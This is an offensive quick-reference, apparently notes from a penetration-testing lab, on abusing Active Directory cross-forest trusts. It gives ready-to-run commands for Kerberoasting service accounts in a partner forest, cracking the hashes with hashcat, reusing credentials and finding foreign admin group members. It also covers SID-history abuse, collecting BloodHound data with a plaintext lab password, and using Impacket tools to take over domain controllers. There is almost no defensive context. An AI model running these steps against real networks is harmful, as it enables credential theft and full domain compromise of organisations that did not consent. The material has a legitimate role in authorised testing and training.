# **Attacking Domain Trusts – Cross-Forest Trust Abuse (Windows Edition)**

*(Fast reference — all action, no fluff)*

---

# **1. Cross-Forest Kerberoasting (Windows)**

### **Enumerate SPN accounts in the OTHER forest**

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

If you see something like `mssqlsvc` → **Kerberoast it**.

---

# **2. Check Group Membership (Is SPN user privileged?)**

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select SamAccountName, MemberOf
```

If member of **Domain Admins / Enterprise Admins** → huge win.

---

# **3. Kerberoast Across the Trust with Rubeus**

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

→ Extract TGS hash → crack with Hashcat.

If cracked = **full control of foreign domain**.

---

# **4. Password Reuse Across Trusted Forests**

If you compromise Domain A admin creds, test reuse in Domain B:

* Built-in Administrator
* Domain Admins
* Enterprise Admins
* Similarly named accounts (adm_john.smith → johnsmith_admin)

This works **a LOT** in real environments.

---

# **5. Foreign Group Membership (Admins from Another Forest)**

Check if Domain A admins have privileges in Domain B:

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Convert SID to user:

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

If it resolves to:

```
INLANEFREIGHT\administrator
```

→ Instant admin across forest.

---

# **6. Validate Access (WinRM)**

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

If login works → **full Domain Admin on the other side**.

---

# **7. Cross-Forest SID History Abuse (High-Level)**

If SID Filtering is **disabled**, you can:

* Add admin SID from Forest A into account in Forest B
* Token includes those SIDs when crossing forest
* You become admin in the partner forest

Used during **user migrations** and **M&A** environments.

(Deep dive covered later.)

---

# ⭐ **Cross-Forest Attack Summary (60-second recap)**

1️⃣ Enumerate SPNs in other forest
2️⃣ Kerberoast → crack → remote Domain Admin
3️⃣ Check password reuse across forests
4️⃣ Check foreign group membership
5️⃣ Abuse SIDHistory if filtering disabled
6️⃣ WinRM or RDP into foreign DC as admin

**Result:** Full compromise of **multiple forests** via trust.

---


## **Attacking Domain Trusts – Cross-Forest Trust Abuse (Linux Edition)**

### 1️⃣ Cross-Forest Kerberoasting (Linux)

**Enumerate SPNs in the foreign forest:**

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

If you see something like:

* `MSSQLsvc/sql01.freightlogstics:1433  ->  mssqlsvc (Domain Admins)`
  then it’s *perfect* roast material.

**Request TGS + dump hash:**

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# optionally:
# GetUserSPNs.py -request -outputfile mssqlsvc_tgs.txt -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

**Crack with Hashcat (Kerberoast RC4, mode 13100):**

```bash
hashcat -m 13100 mssqlsvc_tgs.txt /usr/share/wordlists/rockyou.txt
```

If cracked → **log in as `FREIGHTLOGISTICS\mssqlsvc` (Domain Admin)**.
Then:

* Check for **password reuse** back in `INLANEFREIGHT` (same username or similarly named service accounts).
* Consider a **single, careful password spray** with that password on other service accounts.

---

### 2️⃣ Set Up DNS for BloodHound-Python (Per-Domain)

If you’re not on internal DNS by default, update `/etc/resolv.conf` before running `bloodhound-python`.

**For INLANEFREIGHT.LOCAL:**

```bash
sudo nano /etc/resolv.conf

# Example contents:
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

**Run bloodhound-python (Domain 1):**

```bash
bloodhound-python \
  -d INLANEFREIGHT.LOCAL \
  -dc ACADEMY-EA-DC01 \
  -c All \
  -u forend \
  -p Klmcargo2
```

Zip the JSONs:

```bash
zip -r inlanefreight_bh.zip *.json
```

→ Upload into BloodHound GUI.

---

### 3️⃣ Repeat for the Partner Forest

**For FREIGHTLOGISTICS.LOCAL:**

```bash
sudo nano /etc/resolv.conf

domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

**Run bloodhound-python (Domain 2):**

```bash
bloodhound-python \
  -d FREIGHTLOGISTICS.LOCAL \
  -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
  -c All \
  -u forend@inlanefreight.local \
  -p Klmcargo2
```

Zip and upload:

```bash
zip -r freightlogistics_bh.zip *.json
```

---

### 4️⃣ Find Foreign Admins in BloodHound

In the BloodHound GUI:

* In **Analysis → Pre-Built Queries**
  choose **“Users with Foreign Domain Group Membership”**
* Set **source domain** to `INLANEFREIGHT.LOCAL`

Example finding:

* `INLANEFREIGHT\administrator` → member of `FREIGHTLOGISTICS.LOCAL\Administrators`

That means:

* Popping `INLANEFREIGHT\administrator` = **instant admin in FREIGHTLOGISTICS.LOCAL**, too.

---

### 5️⃣ Cross-Forest Abuse – Mental Model Recap

From Linux, cross-forest game plan:

1. **Kerberoast across trust** with `GetUserSPNs.py`.
2. **Crack TGS hash** with `hashcat -m 13100`.
3. Check **password reuse** across domains, especially for admins/service accounts.
4. Use **bloodhound-python** in *both* forests, feed into BloodHound.
5. Hunt:

   * Foreign group membership (e.g., admins from Forest A in Builtin\Administrators of Forest B).
   * High-value SPNs in other forests.
6. Use resulting creds with Impacket tools (`psexec.py`, `wmiexec.py`, `smbexec.py`) to own DCs across forests.


